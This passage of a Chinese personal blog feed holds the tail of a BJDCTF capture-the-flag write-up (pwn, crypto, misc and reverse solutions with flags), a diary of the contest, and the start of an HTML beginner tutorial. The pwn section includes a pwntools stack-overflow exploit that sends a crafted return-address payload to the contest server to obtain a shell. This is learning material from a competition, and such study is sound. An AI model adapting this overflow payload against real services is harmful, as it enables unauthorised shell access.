alt="r2t3_3"></p><p>这里的_int8变量最多可以存储256大小的数字，如果这个数字为257，那么在内存中其实是257-256=1，这里v3的</p><p>长度只能是[3，8)个字符，考虑到存在栈溢出，所以v3也可以是[259，264）</p><p>因为下面有strcpy()函数，所以查看一波空间：</p><p><img src="/images/r2t3_5.png" alt="r2t3_4"></p><p>再寻找一波，又发现了一个重要点：</p><p><img src="/images/r2t3_4.png" alt="r2t3_4"></p><p>这里发现了这个函数，这就会了吧，利用栈溢出，直接可以getshell，下面附上exp：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>a <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'52.82.12.160'</span><span class="token punctuation">,</span><span class="token number">21013</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input your name:'</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span> <span class="token number">21</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x0804858B</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">259</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h3 id="y1ng"><a href="#y1ng" class="headerlink" title="y1ng"></a>y1ng</h3><p>题目有如下信息：<strong>“QkpEe1czbGMwbWVfVDBfQkpEQ1RGfQ==”</strong></p><p>这是一道签到题目，观察可知Base64加密，直接扔进网站即可</p><p>附上网址：<a href="http://tool.chinaz.com/Tools/Base64.aspx" target="_blank" rel="noopener">Base64</a></p><p>解出来就可以了：</p><p><strong><em>flag：BJD{W3lc0me_T0_BJDCTF}</em></strong></p><h3 id="cat-flag"><a href="#cat-flag" class="headerlink" title="cat_flag"></a>cat_flag</h3><p>话不多说下载附件，打开如下：</p><p><img src="/images/cat.gif" alt="cat.gif"></p><p>是一张动态图，本来以为是图片隐写，但是发现不是，想来想去好像是“010101”，对了，把”鸡腿“看成1，把“米</p><p>饭”看成0，每一行一个2进制数，然后转换成10进制，10进制对应的ASCII码应该就是了；尝试一波从上到下的10</p><p>进制数是：66 74 68 123 77 33 97 48 126 125 ——然后对应的ASCII解出来即可；</p><p><strong><em>flag：BJD{M!a0~}</em></strong></p><h3 id="老文盲了"><a href="#老文盲了" class="headerlink" title="老文盲了"></a>老文盲了</h3><p>打开附件，<u>发现如下一句话</u></p><p><img src="/images/%E6%96%87%E7%9B%B21.png" alt="老文盲1"></p><p>哇！我惊了，都不认识啊，没关系，新华字典，你值得拥有，咳咳咳，我才不会查字典呢，复制到<a href="http://www.duchulai.com/" target="_blank" rel="noopener">读出来</a> 让电脑</p><p>读一下，注音结果如下：</p><p><img src="/images/%E6%96%87%E7%9B%B22.png" alt="老文盲2"></p><p>这就很明显了吧，直接写吧（其实我试了10几次提交 ， 呜呜呜）</p><p><strong><em>flag：BJD{淛匶襫黼瀬鎶軄鶛驕鳓哵}</em></strong></p><h3 id="燕言燕语"><a href="#燕言燕语" class="headerlink" title="燕言燕语"></a>燕言燕语</h3><p>这个题目有如下信息：</p><p><strong>“79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20”</strong></p><p>观察发现应该是十六进制，不多说，直接扔进网站—&gt;<a href="http://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">16进制转文本</a></p><p>得到了—&gt; <strong>yanzi ZJQ{xilzv_iqssuhoc_suzjg}</strong> </p><p>看起来很像凯撒密码，经过了一轮解密后发现好像不对emmm</p><p>后经卓哥的提示，灵光一闪：</p><p>首先 <strong>BJD —&gt; ZJQ</strong>，这是经过某种变化得来的，没错，就是前面的<strong>“yanzi”</strong>做了一个“周期”转换；实际上不难发</p><p>现，<strong>‘y’ , ‘a’ , ‘n’ , ‘z’ , ‘i’</strong>这5个字母在倒过来的字母表中的顺序，也就是 <strong>‘z’</strong> 是<strong>1</strong>，<strong>‘y’</strong> 是<strong>2</strong>…..这样推过来，<strong>‘a’</strong>  是26，</p><p> <strong>‘n’</strong> 是<strong>13</strong>， <strong>‘i’</strong> 是<strong>18</strong>，然后把16进制转换后的字符串用<strong>“yanzi”</strong>推出来的数字当做需要移动的个数来做“<strong>变异凯撒</strong>”… </p><p>//</p><p>官方wp：这个是维吉尼亚密码，“yanzi”作为密钥…</p><p><a href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php" target="_blank" rel="noopener">维吉尼亚</a> 果然都是有技巧的 哎…</p><p>//</p><p>解出来如下：</p><p><strong><em>flag：BJD{yanzi_jiushige_shabi}</em></strong></p><h3 id="灵能精通"><a href="#灵能精通" class="headerlink" title="灵能精通"></a>灵能精通</h3><p>题目是一张图片，打开看一下：</p><p><img src="/images/%E7%81%B5%E8%83%BD.png" alt="灵能精通"></p><p>本来听说的是这是个猪圈密码，但时百度了一波，没有与题目相同的图案，然后花了100“块钱”买了一个Hint，上</p><p>面写着“星际争霸2，神族，后面自己百度”，心想着没玩过啊，记得堆堆和泽辰好像之前打过，就把Hint发到群里</p><p>了，但时他们最后也没想出来，第二天下午，队友发来了一张图，说是圣堂武士密码：</p><p><img src="/images/%E5%9C%A3%E5%A0%82%E6%AD%A6%E5%A3%AB%E5%AF%86%E7%A0%81.png" alt="圣堂武士密码"></p><p>对照着密码表，解出flag</p><p><strong><em>flag：BJD{IMKNIGHTSTEMPLAR}</em></strong></p><h3 id="Y1nglish-y1ng"><a href="#Y1nglish-y1ng" class="headerlink" title="Y1nglish-y1ng"></a>Y1nglish-y1ng</h3><p>这道题目是最有意思的题目了，先打开文件：</p><pre><code>Nkbaslk ds sef aslckdqdqst. Sef aslckdqdqst qo lzqtbw usf ufkoplkt zth oscpslsfko. Dpkfk zfk uqjk dwcko su dscqao qt dpqo aslckdqdqst, kzap su npqap qo jkfw mzoqa. Qu wse zfk qtdkfkodkh qt tkdnsfw okaefqdw, nkbaslk ds czfdqaqczdk. Bkd lk dkbb wse z odsfw.Q nzo pzjqtv hqttkf zd z fkodzefztd npkt Pzffw Odkkbk azlk qt, pk qo z Izcztkok ufsl Izczt med tsn pk qo tsd bqjqtv qt Izczt, lzwmk Pzffw qot'd z Izcztkok tzlk med pk qo fkzbbw z Izcztkok. Pzffw nsfwkh qt z bznwkf'o suuqak wkzfo zvs, med pk qo tsn nsfwqtv zd z mztw. Pk vkdo z vssh ozbzfw, med pk zbnzwo msffsno lstkw ufsl pqo ufqktho zth tkjkf czwo qd mzaw. Pzffw ozn lk zth azlk zthozdzd dpk ozlk dzmbk. Pk pzo tkjkf msffsnkh lstkw ufsl lk. Npqbk pk nzo kzdqtv, Q zowkh pql ds bkth lk &amp;2. Ds lw oefcfqok, pk vzjk lk dpk lstkw qllkhqzdkbw. 'Q pzjk tkjkf msfffsnkh ztw lstkw ufsl wse,' Pzffw ozqh,'os tsn wse azt czw usf lw hqttkf!' Tsn q nqbb vqjk wse npzd wse nztd.MIH{cwdp0t_Mfed3_u0fa3_sF_geqcgeqc_ZQ_Af4aw}</code></pre><p>一看便知，只要解出来每个字母原来的字母就可以了，这里会出现很多问题，作为一名英语弱鸡，硬生生地解了几个小时：</p><p>//</p><p>官方wp：“ 这个字符替换是无序的，直接找个在线的 cryptogram solver 即可解密，比如 quipqiup “</p><p>看到这里心态没了，下面附上解密网站：</p><p><a href="https://quipqiup.com/" target="_blank" rel="noopener">quipqiup</a> </p><p>但是解出来的答案是错误的，看了Hint，最后一个字符串，如果是“ Cr4cy ”，就是错误的，其实这里我推导的时候</p><p>也发现了，字母w对应两个字母—&gt;’y’ 和 ‘k’ 所以改过来即可</p><p>//</p><p><strong><em>flag：BJD{pyth0n_Brut3_f0rc3_oR_quipquip_AI_Cr4ck}</em></strong></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h3 id="小姐姐-y1ng"><a href="#小姐姐-y1ng" class="headerlink" title="小姐姐-y1ng"></a>小姐姐-y1ng</h3><p>这个题目看了好久嘞（我可没说是看小姐姐的啊）</p><p><img src="/images/xjj.png" alt="小姐姐"></p><p>打开图片（哎呀你就别乱看了，赶紧做题），发现箭头的地方有错位，放入WinHex，搜索BJD发现：</p><p><img src="/images/xjjflag.png" alt="XJJ_Flag"></p><p>得到flag：</p><p><strong><em>flag：BJD{haokanma_xjj}</em></strong></p><h3 id="圣火昭昭"><a href="#圣火昭昭" class="headerlink" title="圣火昭昭"></a>圣火昭昭</h3><p><img src="/images/%E5%9C%A3%E7%81%AB.png" alt="圣火昭昭"></p><p>图片好像看不出来，按照常规看了下图片属性，里面藏了一句密文：</p><pre><code>新佛曰：諸壽隸僧壽降吽壽諸壽陀壽摩隸僧缽薩願心壽咤壽囉寂壽闍諸壽哆壽慧壽聞壽色吽愍壽所壽蜜如</code></pre><p>去<a href="http://hi.pcmoe.net/buddha.html" target="_blank" rel="noopener">新约佛论禅</a> 解密可得：</p><p><strong><em>“gemlovecom”</em></strong> 根据提示可知去掉com，得到了<strong><em>”gemlove“</em></strong></p><p>又买了一个Hint：”你猜啊，你倒是猜啊，guess“，气死我了，这句话看不出来啊？</p><p>想来想去想不出来，最后卓哥提示——”outguess“</p><p>百度了一波outguess，最后在Linux里面安装了一波工具，用下面这条指令：</p><pre><code>$ outguess -k "gemlove" -r sheng_huo_zhao_zhao.jpg  hidden.txt</code></pre><p><strong><em>flag：BJD{wdnmd_misc_1s_so_Fuck1ng_e@sy}</em></strong></p><h3 id="A-Beautiful-Picture"><a href="#A-Beautiful-Picture" class="headerlink" title="A_Beautiful_Picture"></a>A_Beautiful_Picture</h3><p>打开附件，是一张jpg：</p><p><img src="/images/beayt.png" alt="A_beautiful_picture"></p><p>貌似么有发现什么，怀疑是一道隐写，丢进WinHex：</p><p><img src="/images/beautiful_flag.png" alt="A_beautiful_picture"></p><p>把这里03改为05，保存后打开：</p><p><img src="/images/Abeautiful_Flag.png" alt="beautiful_Flag"></p><p><strong><em>flag：BJD{PnG_He1ghT_1s_WR0ng}</em></strong></p><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h3 id="guessgame"><a href="#guessgame" class="headerlink" title="guessgame"></a>guessgame</h3><p>这是一道逆向签到题，本来逆向题不会做，但是解答出来的人数非常多，就尝试着做了做</p><p>附件是一个64位的.exe，丢进ida查看了一波：</p><p><img src="/images/guessnum.png" alt="guessnum_flag"></p><p>直接发现flag：</p><p><strong><em>flag：BJD{S1mple_ReV3r5e_W1th_0D_0r_IDA}</em></strong></p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>由于我不是web选手，不会做web题目，所以web爆零，另外的Blockchain和Programming也不会做；</p><p>这篇wp把会做的整理了吧，后面补完题目，继续整理 +_=</p><p>实力就这样，技不如人，甘拜下风！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BJDCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTF——赛后总结</title>
      <link href="/2020/03/23/bjd/"/>
      <url>/2020/03/23/bjd/</url>
      
        <content type="html"><![CDATA[<p>这篇blog应该是昨天晚上写的，但是昨晚很累，打了三把游戏就去睡觉了2333</p><a id="more"></a><p>3月21日上午9点——3月22日晚上9点进行了第二届<strong><em>BJDCTF</em></strong>线上赛，说的是萌新赛，又是七校联盟（<strong>HUT</strong>… …七所</p><p>学校），我们就跟着参加了…</p><p><strong>// 下面是我这两天的“悲惨”经历 =_=</strong></p><h1 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h1><p>第一天早上早早起来（8点多才下床），早饭没吃，就坐在电脑前面准备9点开始比赛，我怀着激动的心情，毕竟</p><p>第一次参加个人赛（之前跟着战队参加过团队赛），开机，打开Chrome、Opera，打开VMware检查网络（断过</p><p>1,2,3…次的网，数不清555），接着就水水群等着9点；</p><p>9点一到，一刷新页面。。。“404”。等到刷新好，签到题一血已经没了，然后我就观察了一波题目，当时题目只有</p><p>一部分，因为这个赛制，有些题目需要做出来另外的题目解锁（我快烦死）；不知如何下手当时，就直接开始从</p><p>pwn开始，第一个pwn题目（忍不住哇的一下就哭了）我到第二天晚上才会，也不能叫会，被大佬指引了一下方</p><p>向；感觉自己好菜好菜，自闭ing！</p><p>下午的时候仍然是做题不顺利，主要是一点思路都没有，Misc真的无能为力，只能抠一抠Crypto（本来主要学的</p><p>pwn) ….好难过啊啊啊</p><p>晚上的时候看了看排行榜，我惊了！！！，前十的选手几乎都没做pwn和web，都在做Misc  //这委屈谁受得了</p><p>最搞笑的是，有人还在群里说，求求前十的大佬，做做pwn和web吧，哈哈哈哈笑了我半天；</p><p>临睡觉的时候看了看排名，前40，感觉不错，明天继续加油<del>~</del></p><h1 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h1><p>这天6点半就起来了，因为昨晚队友们都解答出了一道pwn/game的题目——贪吃蛇，据说玩游戏就可以有答案，</p><p>我没下床就开始玩，哈哈哈，找到了以前玩贪吃蛇的感觉了，但是玩了一局什么也没发现，就去看源码，喔喔，原</p><p>来如此（笑容逐渐 **）就做出来了，好开心；</p><p>然后接着又去网站做那道音乐题目，我卡，那道题真的是神仙题目，我现在脑子还在回放，循环听了几十遍，哎</p><p>呀，真的无语啊； // 感觉学音乐的一下子就能做出来；结果：结束比赛知道答案也弹不出来；</p><p>比赛还剩几个小时的时候，突然题目全部放出来了，太好了，正好有道题目我会，直接拿到了哈哈哈；</p><p>晚上8点钟的时候，我就没做了，自闭了做到最后，身心疲惫，直接去峡谷逛了几圈（/斜眼笑）</p><h1 id="结局"><a href="#结局" class="headerlink" title="结局"></a>结局</h1><p>比赛结束了，发挥得一般般吧，做出来的如下：（rank：14）</p><table><thead><tr><th align="center"><strong>Pwn</strong></th><th align="center">2</th></tr></thead><tbody><tr><td align="center"><strong>Web</strong></td><td align="center"><strong>0</strong></td></tr><tr><td align="center"><strong>Misc</strong></td><td align="center"><strong>3</strong></td></tr><tr><td align="center"><strong>Crypto</strong></td><td align="center"><strong>6</strong></td></tr><tr><td align="center"><strong>Reverse</strong></td><td align="center"><strong>1</strong></td></tr><tr><td align="center"><strong>Total</strong></td><td align="center"><strong>12</strong></td></tr></tbody></table><h1 id="总结与收获"><a href="#总结与收获" class="headerlink" title="总结与收获"></a>总结与收获</h1><p>总的来说，这次比赛收获巨大，首先想说的是：出题人在哪，我给他们寄刀片….开个玩笑嘿嘿</p><p>还是自己太菜了，被出题人按在地上锤，┭┮﹏┭┮    自闭式打法可还行；</p><p>pwn题都是Linux？？！！好好的pwn你来个什么Linux，还在学习中不会做，也是，不能怪出题人，归根结底是</p><p>怪自己水平不够，没得办法；</p><p>Misc &amp; Crypto挺有意思，以后可以发展发展；</p><p>接下来有了学习目标了：</p><p><strong>1、尽快学堆</strong></p><p><strong>2、学隐写</strong></p><p><strong>3、继续学Crypto</strong></p><p><strong>4、还是得学Linux ，跑不了了</strong></p><p>.</p><p>.</p><p>.</p><p>.</p><p>长路漫漫，谁都想做大佬，继续加油，Fighting！！！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NUL </tag>
            
            <tag> BJDCTF </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML学习笔记</title>
      <link href="/2020/03/13/html/"/>
      <url>/2020/03/13/html/</url>
      
        <content type="html"><![CDATA[<p>到目前为止，今年入的两个坑，一个是CTF，这个暂且不说，另一个是Blog；</p><a id="more"></a><h3 id="前篇"><a href="#前篇" class="headerlink" title="前篇"></a>前篇</h3><p>Blog这东西前面的文章也说了，很烦人其实，尤其是配置文件的时候，老是出错；最近看Hexo主题的时候又看上</p><p>了一个主题——Matery；这款主题页面清晰，画风很好，功能很多，想着就换了，但是因为不会前端的内容，里</p><p>面的好多东西，比如 JS 和 CSS 文件看不懂，导致博客页面老是出现bug，于是乎，哈哈哈，就有接下来的学了；</p><p>前端三件套 = HTML + CSS + JS；这些是web开发需要学的东西，非常好玩；</p><p>这篇博客就整理我的学习历程，先开始的HTML，所以先整理HTML；</p><h3 id="IDE"><a href="#IDE" class="headerlink" title="IDE"></a>IDE</h3><p>有人会问，编写前端这些代码需要什么IDE，其实这个不需要太大的IDE就行；最简单的是记事本，哈哈哈，没想</p><p>到吧；想着也是，把后缀改成html就行了，还可以用Notepad++；我也在网上找了几款，比如说像Vscode，</p><p>jetbrains公司的webstorm等等，这些都可以用，我也问了几个朋友，挑来挑去，咦~，发现了一款非常好的软件</p><p>——HBuilderX；</p><p>先说说它的好处，这款软件内存特别小，下载就几十MB，非常方便，它可以直接生成一个端口（应该算是），就</p><p>可以浏览你写的网页的样式；最重要的一个优点是，他可以代码补全，对于初学者来说，真的不错；</p><h3 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h3><p>相信大家应该都看过网页源码，初学者可能会问html，总得有个框架吧？有的有的，下面来看：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>是不是看上去框架很复杂？yes/no ? 哈哈哈，这里就体现出HBuilderX的好处了，前面提到了，可以代码补全，当</p><p>然也可以直接把框架生成出来；</p><h3 id="简单编写"><a href="#简单编写" class="headerlink" title="简单编写"></a>简单编写</h3><p>先介绍一些最简单的用法吧；</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>   <span class="token comment" spellcheck="true">&lt;!-- 网页标题 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>   <span class="token comment" spellcheck="true">&lt;!-- 1级标题 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>   <span class="token comment" spellcheck="true">&lt;!-- 2级标题 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>   <span class="token comment" spellcheck="true">&lt;!-- 3级标题 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">></span></span>   <span class="token comment" spellcheck="true">&lt;!-- 4级标题 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">></span></span>   <span class="token comment" spellcheck="true">&lt;!-- 5级标题 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h6</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h6</span><span class="token punctuation">></span></span>   <span class="token comment" spellcheck="true">&lt;!-- 6级标题 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>              <span class="token comment" spellcheck="true">&lt;!-- 段落标签，文字会独占一行 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span>                <span class="token comment" spellcheck="true">&lt;!-- 定义斜体字--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span>              <span class="token comment" spellcheck="true">&lt;!-- 定义粗体字 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>big</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>big</span><span class="token punctuation">></span></span>          <span class="token comment" spellcheck="true">&lt;!-- 定义大号字 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>small</span><span class="token punctuation">></span></span>        <span class="token comment" spellcheck="true">&lt;!-- 定义小号字 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span>      <span class="token comment" spellcheck="true">&lt;!-- 定义加重字 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span>             <span class="token comment" spellcheck="true">&lt;!-- 定义着重字 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sub</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sub</span><span class="token punctuation">></span></span>          <span class="token comment" spellcheck="true">&lt;!-- 定义下标字 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sup</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sup</span><span class="token punctuation">></span></span>          <span class="token comment" spellcheck="true">&lt;!-- 定义上标字 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ins</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ins</span><span class="token punctuation">></span></span>          <span class="token comment" spellcheck="true">&lt;!-- 定义下划线 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>del</span><span class="token punctuation">></span></span>...<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>del</span><span class="token punctuation">></span></span>          <span class="token comment" spellcheck="true">&lt;!-- 定义删除字 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>      <span class="token comment" spellcheck="true">&lt;!-- 换行 --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span> <span class="token punctuation">/></span></span>      <span class="token comment" spellcheck="true">&lt;!-- 水平线 --></span><span class="token entity" title="&nbsp;">&amp;nbsp;</span>      <span class="token comment" spellcheck="true">&lt;!-- 网页上显示一个空格 --></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看上去有点晕，那就来演示一遍</p><p>这是代码：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>2020.3.14<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>*测试标题效果*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h4</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h4</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h5</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h5</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h6</span><span class="token punctuation">></span></span>Hello HTML!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h6</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>*测试字体效果*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token 